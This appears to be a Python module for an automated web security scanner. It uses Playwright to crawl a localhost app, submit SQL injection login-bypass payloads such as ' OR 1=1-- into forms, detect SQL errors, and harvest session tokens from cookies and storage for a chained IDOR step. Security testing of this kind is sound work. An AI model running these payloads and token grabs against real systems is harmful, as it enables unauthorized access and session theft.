import json
from urllib.parse import urlparse

from playwright.sync_api import sync_playwright


SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1'--",
    "admin'--"
]


TEST_PASSWORD = "test"


IGNORED_INPUT_TYPES = {
    "password",
    "checkbox",
    "radio",
    "submit",
    "button",
    "hidden",
    "range",
    "file",
    "date",
    "time",
    "color"
}


def is_local_target(url, base_url):
    try:
        target = urlparse(url)
        base = urlparse(base_url)

        if target.hostname not in {
            "localhost",
            "127.0.0.1"
        }:
            return False

        if target.port != base.port:
            return False

        return True

    except Exception:
        return False


def normalize_url(url):
    if not url:
        return url

    parsed = urlparse(url)

    if parsed.fragment:
        return (
            f"{parsed.scheme}://{parsed.netloc}/"
            f"#{parsed.fragment}"
        )

    return url


def get_sqli_targets(state):
    target_url = state["target_url"]
    targets = []

    with sync_playwright() as p:

        browser = p.chromium.launch(
            headless=True
        )

        context = browser.new_context()
        page = context.new_page()

        try:

            page.goto(
                target_url,
                wait_until="domcontentloaded",
                timeout=15000
            )

            page.wait_for_timeout(700)

            visited = set()

            links = page.locator("a")

            for i in range(links.count()):

                try:

                    href = links.nth(i).get_attribute(
                        "href"
                    )

                    if not href:
                        continue

                    if href.startswith(
                        "javascript:"
                    ):
                        continue

                    if href.startswith("#/"):

                        url = (
                            target_url.rstrip("/")
                            + href
                        )

                    else:

                        url = href

                    if not url.startswith("http"):
                        continue

                    if not is_local_target(
                        url,
                        target_url
                    ):
                        continue

                    url = normalize_url(url)

                    visited.add(url)

                except Exception:
                    continue

            visited.add(
                normalize_url(target_url)
            )

            for url in list(visited):

                if "#/login" not in url.lower():
                    continue

                try:

                    page.goto(
                        url,
                        wait_until="domcontentloaded",
                        timeout=15000
                    )

                    page.wait_for_timeout(700)

                    email = page.locator(
                        "input#email"
                    )

                    password = page.locator(
                        "input#password"
                    )

                    submit = page.locator(
                        "#loginButton"
                    )

                    if (
                        email.count() > 0
                        and password.count() > 0
                        and submit.count() > 0
                    ):

                        targets.append({
                            "type": "login_form",
                            "url": url,
                            "email_selector": "#email",
                            "password_selector": "#password",
                            "submit_selector": "#loginButton"
                        })

                except Exception:
                    continue

            for url in list(visited):

                if any(
                    target.get("url") == url
                    and target.get("type")
                    == "login_form"
                    for target in targets
                ):
                    continue

                try:

                    page.goto(
                        url,
                        wait_until="domcontentloaded",
                        timeout=15000
                    )

                    page.wait_for_timeout(500)

                    inputs = page.locator(
                        "input"
                    )

                    for i in range(inputs.count()):

                        try:

                            field = inputs.nth(i)

                            input_type = (
                                field.get_attribute(
                                    "type"
                                )
                                or "text"
                            ).lower()

                            if input_type in (
                                IGNORED_INPUT_TYPES
                            ):
                                continue

                            if not field.is_visible():
                                continue

                            if not field.is_enabled():
                                continue

                            targets.append({
                                "type": "input",
                                "url": url,
                                "index": i,
                                "input_type": input_type
                            })

                        except Exception:
                            continue

                except Exception:
                    continue

        finally:

            browser.close()

    unique_targets = []
    seen = set()

    for target in targets:

        key = json.dumps(
            target,
            sort_keys=True
        )

        if key not in seen:

            seen.add(key)
            unique_targets.append(target)

    return unique_targets


def _get_auth_token(context):

    try:

        cookies = context.cookies()

        for cookie in cookies:

            if (
                cookie.get("name", "").lower()
                == "token"
            ):

                value = cookie.get("value")

                if value:
                    return value, "cookie"

    except Exception:
        pass

    try:

        for page in context.pages:

            try:

                storage = page.evaluate(
                    """
                    () => ({
                        localStorage: {...localStorage},
                        sessionStorage: {...sessionStorage}
                    })
                    """
                )

                local_storage = storage.get(
                    "localStorage",
                    {}
                )

                session_storage = storage.get(
                    "sessionStorage",
                    {}
                )

                if local_storage.get("token"):

                    return (
                        local_storage["token"],
                        "localStorage"
                    )

                if session_storage.get("token"):

                    return (
                        session_storage["token"],
                        "sessionStorage"
                    )

            except Exception:
                continue

    except Exception:
        pass

    return None, None


def _get_cookie_names(context):

    try:

        return [
            cookie.get("name")
            for cookie in context.cookies()
        ]

    except Exception:

        return []


def _get_storage(page):

    try:

        return page.evaluate(
            """
            () => ({
                localStorage: {...localStorage},
                sessionStorage: {...sessionStorage}
            })
            """
        )

    except Exception:

        return {
            "localStorage": {},
            "sessionStorage": {}
        }


def _dismiss_overlay(page):

    try:

        page.keyboard.press("Escape")
        page.wait_for_timeout(200)

    except Exception:
        pass


def _submit_login(page, submit):

    try:

        _dismiss_overlay(page)

        submit.click(
            timeout=3000
        )

        return True

    except Exception:

        try:

            submit.evaluate(
                """
                element => element.click()
                """
            )

            return True

        except Exception:

            return False


def _test_login_sqli(
    page,
    context,
    target,
    payload
):

    result = {
        "payload": payload,
        "vulnerable": False,
        "authenticated": False,
        "token_found": False,
        "token_source": None,
        "url_changed": False,
        "login_transition": False,
        "logout_visible": False,
        "error": None
    }

    try:

        page.goto(
            target["url"],
            wait_until="domcontentloaded",
            timeout=15000
        )

        page.wait_for_timeout(500)

        baseline_url = page.url

        email = page.locator(
            target["email_selector"]
        )

        password = page.locator(
            target["password_selector"]
        )

        submit = page.locator(
            target["submit_selector"]
        )

        if (
            email.count() == 0
            or password.count() == 0
            or submit.count() == 0
        ):

            result["error"] = (
                "Login form elements not found."
            )

            return result

        email.fill(payload)

        password.fill(
            TEST_PASSWORD
        )

        submitted = _submit_login(
            page,
            submit
        )

        if not submitted:

            result["error"] = (
                "Unable to submit login form."
            )

            return result

        page.wait_for_timeout(1500)

        current_url = page.url

        result["url_changed"] = (
            current_url != baseline_url
        )

        result["login_transition"] = (
            "#/login" not in
            current_url.lower()
        )

        token, token_source = (
            _get_auth_token(context)
        )

        result["token_found"] = bool(token)
        result["token_source"] = token_source

        try:

            logout = page.locator(
                "text=Logout"
            )

            result["logout_visible"] = (
                logout.count() > 0
                and logout.first.is_visible()
            )

        except Exception:

            result["logout_visible"] = False

        result["authenticated"] = (
            bool(token)
            or result["logout_visible"]
        )

        if result["authenticated"]:
            result["vulnerable"] = True

        return result

    except Exception as exc:

        result["error"] = str(exc)

        return result


def _test_generic_sqli(
    page,
    context,
    target,
    payload
):

    result = {
        "payload": payload,
        "vulnerable": False,
        "authenticated": False,
        "token_found": False,
        "token_source": None,
        "url_changed": False,
        "login_transition": False,
        "logout_visible": False,
        "error": None
    }

    try:

        page.goto(
            target["url"],
            wait_until="domcontentloaded",
            timeout=15000
        )

        page.wait_for_timeout(400)

        inputs = page.locator(
            "input"
        )

        index = target["index"]

        if index >= inputs.count():

            result["error"] = (
                "Selected input no longer exists."
            )

            return result

        field = inputs.nth(index)

        if not field.is_visible():

            result["error"] = (
                "Selected input is not visible."
            )

            return result

        baseline_url = page.url

        field.fill(payload)

        try:

            field.press("Enter")

        except Exception:
            pass

        page.wait_for_timeout(1000)

        current_url = page.url

        result["url_changed"] = (
            current_url != baseline_url
        )

        body_text = ""

        try:

            body_text = (
                page.locator("body")
                .inner_text()
                .lower()
            )

        except Exception:
            pass

        sql_errors = [
            "sql syntax",
            "syntax error",
            "sqlite",
            "mysql",
            "postgresql",
            "postgres",
            "sequelize",
            "database error",
            "sqlstate",
            "unterminated string",
            "you have an error in your sql"
        ]

        result["vulnerable"] = any(
            indicator in body_text
            for indicator in sql_errors
        )

        token, token_source = (
            _get_auth_token(context)
        )

        result["token_found"] = bool(token)
        result["token_source"] = token_source
        result["authenticated"] = bool(token)

        return result

    except Exception as exc:

        result["error"] = str(exc)

        return result


def execute_sqli_test(
    state,
    target
):

    target_url = state["target_url"]

    if isinstance(target, str):

        target = {
            "type": "input",
            "url": target_url,
            "index": 0
        }

    if not is_local_target(
        target.get("url", ""),
        target_url
    ):

        return {
            "success": False,
            "data": {
                "vulnerable": False,
                "error": "Non-local target rejected."
            }
        }

    observations = []

    vulnerable = False
    authenticated = False

    chain_trigger = False
    chain_data = None

    with sync_playwright() as p:

        browser = p.chromium.launch(
            headless=True
        )

        context = browser.new_context()

        page = context.new_page()

        try:

            for payload in SQLI_PAYLOADS:

                if target.get(
                    "type"
                ) == "login_form":

                    result = _test_login_sqli(
                        page,
                        context,
                        target,
                        payload
                    )

                else:

                    result = _test_generic_sqli(
                        page,
                        context,
                        target,
                        payload
                    )

                observations.append(
                    result
                )

                if result.get(
                    "vulnerable"
                ):

                    vulnerable = True

                if result.get(
                    "authenticated"
                ):

                    authenticated = True
                    chain_trigger = True

                    token, token_source = (
                        _get_auth_token(
                            context
                        )
                    )

                    chain_data = {
                        "chain": "sqli_to_idor",
                        "reason": (
                            "SQL injection produced "
                            "an authenticated session."
                        ),
                        "authenticated": True,
                        "auth_token_found": bool(
                            token
                        ),
                        "auth_token_source": (
                            token_source
                        ),

                        "authenticated_session": {
                            "token": token
                        },

                        "target": target,
                        "observations": observations
                    }

                    break

            token, token_source = (
                _get_auth_token(context)
            )

            cookie_names = (
                _get_cookie_names(context)
            )

            storage = _get_storage(
                page
            )

            detail = (
                "SQL injection testing completed."
            )

            if vulnerable:

                detail = (
                    "Potential SQL injection "
                    "behavior detected."
                )

            if authenticated:

                detail += (
                    " SQL injection resulted in "
                    "an authenticated session."
                )

            return {
                "success": True,
                "data": {
                    "vulnerable": vulnerable,
                    "authenticated": authenticated,
                    "target": target,
                    "observations": observations,
                    "cookie_names": cookie_names,
                    "auth_token_found": bool(
                        token
                    ),
                    "auth_token_source": (
                        token_source
                    ),
                    "storage": storage,
                    "chain_trigger": chain_trigger,
                    "chain_data": chain_data,
                    "detail": detail
                }
            }

        finally:

            browser.close()